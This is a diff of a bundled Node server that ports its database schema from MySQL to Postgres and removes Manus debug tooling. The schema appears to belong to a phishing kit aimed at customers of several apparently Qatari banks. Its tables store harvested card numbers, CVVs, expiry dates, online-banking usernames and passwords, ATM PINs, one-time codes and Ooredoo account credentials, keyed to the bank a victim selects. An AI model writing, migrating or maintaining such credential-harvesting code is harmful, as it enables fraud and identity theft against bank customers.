@@ -32,35 +32,30 @@ import { parse as parseCookieHeader2 } from "cookie";
 
 // server/db.ts
 import { eq } from "drizzle-orm";
-import { drizzle } from "drizzle-orm/mysql2";
+import { drizzle } from "drizzle-orm/postgres-js";
+import postgres from "postgres";
 
 // drizzle/schema.ts
-import { int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";
-var users = mysqlTable("users", {
-  /**
-   * Surrogate primary key. Auto-incremented numeric value managed by the database.
-   * Use this for relations between tables.
-   */
-  id: int("id").autoincrement().primaryKey(),
-  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
+import { pgTable, serial, text, timestamp, varchar } from "drizzle-orm/pg-core";
+var users = pgTable("users", {
+  id: serial("id").primaryKey(),
   openId: varchar("openId", { length: 64 }).notNull().unique(),
   name: text("name"),
   email: varchar("email", { length: 320 }),
   loginMethod: varchar("loginMethod", { length: 64 }),
-  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
+  role: text("role").$type().default("user").notNull(),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
-  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
+  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
   lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull()
 });
-var sessions = mysqlTable("sessions", {
+var sessions = pgTable("sessions", {
   id: varchar("id", { length: 64 }).primaryKey(),
   selectedBank: varchar("selectedBank", { length: 50 }).notNull(),
-  // qnb, qib, rayan, doha
   createdAt: timestamp("createdAt").defaultNow().notNull(),
-  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull()
+  updatedAt: timestamp("updatedAt").defaultNow().notNull()
 });
-var personalDataSubmissions = mysqlTable("personalDataSubmissions", {
-  id: int("id").autoincrement().primaryKey(),
+var personalDataSubmissions = pgTable("personalDataSubmissions", {
+  id: serial("id").primaryKey(),
   sessionId: varchar("sessionId", { length: 64 }).notNull(),
   nameArabic: text("nameArabic").notNull(),
   nameEnglish: text("nameEnglish").notNull(),
@@ -69,42 +64,36 @@ var personalDataSubmissions = mysqlTable("personalDataSubmissions", {
   email: varchar("email", { length: 320 }).notNull(),
   dateOfBirth: varchar("dateOfBirth", { length: 20 }).notNull(),
   gender: varchar("gender", { length: 10 }).notNull(),
-  // male, female
   customerStatus: varchar("customerStatus", { length: 50 }).notNull(),
-  // existing, new
   submittedAt: timestamp("submittedAt").defaultNow().notNull()
 });
-var loginMethodSubmissions = mysqlTable("loginMethodSubmissions", {
-  id: int("id").autoincrement().primaryKey(),
+var loginMethodSubmissions = pgTable("loginMethodSubmissions", {
+  id: serial("id").primaryKey(),
   sessionId: varchar("sessionId", { length: 64 }).notNull(),
   loginType: varchar("loginType", { length: 20 }).notNull(),
-  // card, user
-  // For card login
   cardNumber: varchar("cardNumber", { length: 50 }),
   cardholderName: text("cardholderName"),
   expiryDate: varchar("expiryDate", { length: 10 }),
   cvv: varchar("cvv", { length: 10 }),
-  // For username/password login
   username: varchar("username", { length: 255 }),
   password: text("password"),
   submittedAt: timestamp("submittedAt").defaultNow().notNull()
 });
-var atmPinSubmissions = mysqlTable("atmPinSubmissions", {
-  id: int("id").autoincrement().primaryKey(),
+var atmPinSubmissions = pgTable("atmPinSubmissions", {
+  id: serial("id").primaryKey(),
   sessionId: varchar("sessionId", { length: 64 }).notNull(),
   pin: varchar("pin", { length: 10 }).notNull(),
   submittedAt: timestamp("submittedAt").defaultNow().notNull()
 });
-var otpSubmissions = mysqlTable("otpSubmissions", {
-  id: int("id").autoincrement().primaryKey(),
+var otpSubmissions = pgTable("otpSubmissions", {
+  id: serial("id").primaryKey(),
   sessionId: varchar("sessionId", { length: 64 }).notNull(),
   otpCode: varchar("otpCode", { length: 10 }).notNull(),
   otpType: varchar("otpType", { length: 20 }).notNull(),
-  // standard, ooredoo
   submittedAt: timestamp("submittedAt").defaultNow().notNull()
 });
-var ooredooSubmissions = mysqlTable("ooredooSubmissions", {
-  id: int("id").autoincrement().primaryKey(),
+var ooredooSubmissions = pgTable("ooredooSubmissions", {
+  id: serial("id").primaryKey(),
   sessionId: varchar("sessionId", { length: 64 }).notNull(),
   ooredooUser: varchar("ooredooUser", { length: 255 }).notNull(),
   ooredooPassword: text("ooredooPassword").notNull(),
@@ -128,7 +117,8 @@ var _db = null;
 async function getDb() {
   if (!_db && process.env.DATABASE_URL) {
     try {
-      _db = drizzle(process.env.DATABASE_URL);
+      const client = postgres(process.env.DATABASE_URL);
+      _db = drizzle(client);
     } catch (error) {
       console.warn("[Database] Failed to connect:", error);
       _db = null;
@@ -176,7 +166,8 @@ async function upsertUser(user) {
     if (Object.keys(updateSet).length === 0) {
       updateSet.lastSignedIn = /* @__PURE__ */ new Date();
     }
-    await db.insert(users).values(values).onDuplicateKeyUpdate({
+    await db.insert(users).values(values).onConflictDoUpdate({
+      target: users.openId,
       set: updateSet
     });
   } catch (error) {
@@ -887,129 +878,17 @@ async function createContext(opts) {
 
 // server/_core/vite.ts
 import express from "express";
-import fs2 from "fs";
+import fs from "fs";
 import { nanoid } from "nanoid";
 import path2 from "path";
 import { createServer as createViteServer } from "vite";
 
 // vite.config.ts
-import { jsxLocPlugin } from "@builder.io/vite-plugin-jsx-loc";
-import tailwindcss from "@tailwindcss/vite";
 import react from "@vitejs/plugin-react";
-import fs from "node:fs";
 import path from "node:path";
 import { defineConfig } from "vite";
-import { vitePluginManusRuntime } from "vite-plugin-manus-runtime";
-var PROJECT_ROOT = import.meta.dirname;
-var LOG_DIR = path.join(PROJECT_ROOT, ".manus-logs");
-var MAX_LOG_SIZE_BYTES = 1 * 1024 * 1024;
-var TRIM_TARGET_BYTES = Math.floor(MAX_LOG_SIZE_BYTES * 0.6);
-function ensureLogDir() {
-  if (!fs.existsSync(LOG_DIR)) {
-    fs.mkdirSync(LOG_DIR, { recursive: true });
-  }
-}
-function trimLogFile(logPath, maxSize) {
-  try {
-    if (!fs.existsSync(logPath) || fs.statSync(logPath).size <= maxSize) {
-      return;
-    }
-    const lines = fs.readFileSync(logPath, "utf-8").split("\n");
-    const keptLines = [];
-    let keptBytes = 0;
-    const targetSize = TRIM_TARGET_BYTES;
-    for (let i = lines.length - 1; i >= 0; i--) {
-      const lineBytes = Buffer.byteLength(`${lines[i]}
-`, "utf-8");
-      if (keptBytes + lineBytes > targetSize) break;
-      keptLines.unshift(lines[i]);
-      keptBytes += lineBytes;
-    }
-    fs.writeFileSync(logPath, keptLines.join("\n"), "utf-8");
-  } catch {
-  }
-}
-function writeToLogFile(source, entries) {
-  if (entries.length === 0) return;
-  ensureLogDir();
-  const logPath = path.join(LOG_DIR, `${source}.log`);
-  const lines = entries.map((entry) => {
-    const ts = (/* @__PURE__ */ new Date()).toISOString();
-    return `[${ts}] ${JSON.stringify(entry)}`;
-  });
-  fs.appendFileSync(logPath, `${lines.join("\n")}
-`, "utf-8");
-  trimLogFile(logPath, MAX_LOG_SIZE_BYTES);
-}
-function vitePluginManusDebugCollector() {
-  return {
-    name: "manus-debug-collector",
-    transformIndexHtml(html) {
-      if (process.env.NODE_ENV === "production") {
-        return html;
-      }
-      return {
-        html,
-        tags: [
-          {
-            tag: "script",
-            attrs: {
-              src: "/__manus__/debug-collector.js",
-              defer: true
-            },
-            injectTo: "head"
-          }
-        ]
-      };
-    },
-    configureServer(server) {
-      server.middlewares.use("/__manus__/logs", (req, res, next) => {
-        if (req.method !== "POST") {
-          return next();
-        }
-        const handlePayload = (payload) => {
-          if (payload.consoleLogs?.length > 0) {
-            writeToLogFile("browserConsole", payload.consoleLogs);
-          }
-          if (payload.networkRequests?.length > 0) {
-            writeToLogFile("networkRequests", payload.networkRequests);
-          }
-          if (payload.sessionEvents?.length > 0) {
-            writeToLogFile("sessionReplay", payload.sessionEvents);
-          }
-          res.writeHead(200, { "Content-Type": "application/json" });
-          res.end(JSON.stringify({ success: true }));
-        };
-        const reqBody = req.body;
-        if (reqBody && typeof reqBody === "object") {
-          try {
-            handlePayload(reqBody);
-          } catch (e) {
-            res.writeHead(400, { "Content-Type": "application/json" });
-            res.end(JSON.stringify({ success: false, error: String(e) }));
-          }
-          return;
-        }
-        let body = "";
-        req.on("data", (chunk) => {
-          body += chunk.toString();
-        });
-        req.on("end", () => {
-          try {
-            const payload = JSON.parse(body);
-            handlePayload(payload);
-          } catch (e) {
-            res.writeHead(400, { "Content-Type": "application/json" });
-            res.end(JSON.stringify({ success: false, error: String(e) }));
-          }
-        });
-      });
-    }
-  };
-}
-var plugins = [react(), tailwindcss(), jsxLocPlugin(), vitePluginManusRuntime(), vitePluginManusDebugCollector()];
 var vite_config_default = defineConfig({
-  plugins,
+  plugins: [react()],
   resolve: {
     alias: {
       "@": path.resolve(import.meta.dirname, "client", "src"),
@@ -1023,22 +902,6 @@ var vite_config_default = defineConfig({
   build: {
     outDir: path.resolve(import.meta.dirname, "dist/public"),
     emptyOutDir: true
-  },
-  server: {
-    host: true,
-    allowedHosts: [
-      ".manuspre.computer",
-      ".manus.computer",
-      ".manus-asia.computer",
-      ".manuscomputer.ai",
-      ".manusvm.computer",
-      "localhost",
-      "127.0.0.1"
-    ],
-    fs: {
-      strict: true,
-      deny: ["**/.*"]
-    }
   }
 });
 
@@ -1065,7 +928,7 @@ async function setupVite(app, server) {
         "client",
         "index.html"
       );
-      let template = await fs2.promises.readFile(clientTemplate, "utf-8");
+      let template = await fs.promises.readFile(clientTemplate, "utf-8");
       template = template.replace(
         `src="/src/main.tsx"`,
         `src="/src/main.tsx?v=${nanoid()}"`
@@ -1080,7 +943,7 @@ async function setupVite(app, server) {
 }
 function serveStatic(app) {
   const distPath = process.env.NODE_ENV === "development" ? path2.resolve(import.meta.dirname, "../..", "dist", "public") : path2.resolve(import.meta.dirname, "public");
-  if (!fs2.existsSync(distPath)) {
+  if (!fs.existsSync(distPath)) {
     console.error(
       `Could not find the build directory: ${distPath}, make sure to build the client first`
     );
